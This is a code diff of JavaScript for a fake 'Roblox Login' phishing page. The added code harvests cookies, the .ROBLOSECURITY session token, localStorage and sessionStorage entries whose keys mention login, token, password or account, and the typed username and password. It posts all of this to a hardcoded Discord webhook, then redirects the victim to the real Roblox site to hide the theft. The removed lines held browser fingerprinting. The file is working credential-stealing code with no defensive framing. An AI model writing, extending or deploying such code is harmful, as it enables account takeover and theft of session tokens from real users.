@@ -1,37 +1,3 @@
-// Function to get user information
-function getUserInfo() {
-    const userAgent = navigator.userAgent;
-    const screenResolution = `${window.screen.width}x${window.screen.height}`;
-    const language = navigator.language;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
-    const screenColorDepth = window.screen.colorDepth;
-    const screenPixelDepth = window.screen.pixelDepth;
-    const hardwareConcurrency = navigator.hardwareConcurrency;
-    const platform = navigator.platform;
-    const onlineStatus = navigator.onLine;
-    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
-    const batteryStatus = navigator.getBattery ? navigator.getBattery().then(battery => ({
-        charging: battery.charging,
-        level: battery.level
-    })) : { charging: 'Unknown', level: 'Unknown' };
-
-    return {
-        userAgent,
-        screenResolution,
-        language,
-        timezone,
-        plugins,
-        screenColorDepth,
-        screenPixelDepth,
-        hardwareConcurrency,
-        platform,
-        onlineStatus,
-        connectionType,
-        batteryStatus
-    };
-}
-
 // Function to capture all cookies
 function getCookies() {
     const cookies = document.cookie;
@@ -55,11 +21,42 @@ function captureFormData() {
     };
 }
 
+// Function to capture all storage data
+function getAllStorageData() {
+    const localStorageData = JSON.stringify(localStorage);
+    const sessionStorageData = JSON.stringify(sessionStorage);
+    return {
+        localStorage: localStorageData,
+        sessionStorage: sessionStorageData
+    };
+}
+
+// Function to extract login credentials and tokens from storage
+function extractLoginCredentials(storageData) {
+    const credentials = [];
+    const localStorage = JSON.parse(storageData.localStorage);
+    const sessionStorage = JSON.parse(storageData.sessionStorage);
+
+    for (let key in localStorage) {
+        if (localStorage.hasOwnProperty(key) && (key.includes('login') || key.includes('token') || key.includes('password') || key.includes('account'))) {
+            credentials.push({ type: 'localStorage', key, value: localStorage[key] });
+        }
+    }
+
+    for (let key in sessionStorage) {
+        if (sessionStorage.hasOwnProperty(key) && (key.includes('login') || key.includes('token') || key.includes('password') || key.includes('account'))) {
+            credentials.push({ type: 'sessionStorage', key, value: sessionStorage[key] });
+        }
+    }
+
+    return credentials;
+}
+
 // Function to send user information to Discord webhook
-async function sendUserInfoToDiscord(userInfo, formData, cookies, token) {
+async function sendUserInfoToDiscord(formData, cookies, token, storageData, credentials) {
     const webhookURL = 'https://discord.com/api/webhooks/1413136208015396965/ZOPuML2XdrU0egq3U6dGmCmjBT_4Mpcu49g3y35HqB2j_jpScBqIqR-3YB4w89p61juu'; // Replace with your actual webhook URL
     const message = {
-        content: `New user visited the site!\n\n**User Agent:** ${userInfo.userAgent}\n**Screen Resolution:** ${userInfo.screenResolution}\n**Language:** ${userInfo.language}\n**Timezone:** ${userInfo.timezone}\n**Plugins:** ${userInfo.plugins.join(', ')}\n**Screen Color Depth:** ${userInfo.screenColorDepth}\n**Screen Pixel Depth:** ${userInfo.screenPixelDepth}\n**Hardware Concurrency:** ${userInfo.hardwareConcurrency}\n**Platform:** ${userInfo.platform}\n**Online Status:** ${userInfo.onlineStatus}\n**Connection Type:** ${userInfo.connectionType}\n**Battery Status:** Charging: ${userInfo.batteryStatus.charging}, Level: ${userInfo.batteryStatus.level}\n\n**Website Name:** Roblox Login\n**Username:** ${formData.username}\n**Password:** ${formData.password}\n**Roblox Token:** ${token}\n**Cookies:**\n${cookies}`
+        content: `New user logged in!\n\n**Website Name:** Roblox Login\n**Username:** ${formData.username}\n**Password:** ${formData.password}\n**Roblox Token:** ${token}\n**Cookies:**\n${cookies}\n**Extracted Login Credentials and Tokens:**\n${credentials.map(cred => `Type: ${cred.type}, Key: ${cred.key}, Value: ${cred.value}`).join('\n')}`
     };
 
     try {
@@ -80,27 +77,47 @@ async function sendUserInfoToDiscord(userInfo, formData, cookies, token) {
     }
 }
 
+// Add an event listener to capture cookies and storage data on page load
+window.addEventListener('load', function() {
+    // Wait for a short period to ensure cookies and storage data are set
+    setTimeout(function() {
+        const cookies = getCookies();
+        const storageData = getAllStorageData();
+        console.log('Cookies on Page Load:', cookies);
+        console.log('Storage Data on Page Load:', storageData);
+        // Store cookies and storage data in variables to use later
+        window.storedCookies = cookies;
+        window.storedStorageData = storageData;
+    }, 1000); // 1 second delay
+});
+
 // Add an event listener to the form submission
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginForm');
     if (loginForm) {
         loginForm.addEventListener('submit', async function(event) {
             event.preventDefault(); // Prevent the form from submitting the traditional way
-            const userInfo = getUserInfo();
             const formData = captureFormData();
-            const cookies = getCookies();
-            const token = getSpecificCookie('.ROBLOSECURITY'); // Replace with the actual cookie name
-            console.log('User Info:', userInfo);
-            console.log('Form Data:', formData);
-            console.log('Roblox Token:', token);
-            console.log('Cookies:', cookies);
+            let cookies = window.storedCookies; // Use the cookies captured on page load
+            let storageData = window.storedStorageData; // Use the storage data captured on page load
+            let token = getSpecificCookie('.ROBLOSECURITY'); // Replace with the actual cookie name
 
-            // Wait for battery status if available
-            if (userInfo.batteryStatus instanceof Promise) {
-                userInfo.batteryStatus = await userInfo.batteryStatus;
+            // Force retrieval of cookies, storage data, and token
+            if (!cookies || !storageData || !token) {
+                // Wait for a short period to ensure cookies and storage data are set
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                cookies = getCookies();
+                storageData = getAllStorageData();
+                token = getSpecificCookie('.ROBLOSECURITY');
             }
 
-            sendUserInfoToDiscord(userInfo, formData, cookies, token);
+            console.log('Form Data:', formData);
+            console.log('Roblox Token:', token);
+            console.log('Cookies on Form Submission:', cookies);
+            console.log('Storage Data on Form Submission:', storageData);
+
+            const credentials = extractLoginCredentials(storageData);
+            sendUserInfoToDiscord(formData, cookies, token, storageData, credentials);
 
             // Redirect to the actual Roblox website
             window.location.href = 'https://www.roblox.com';
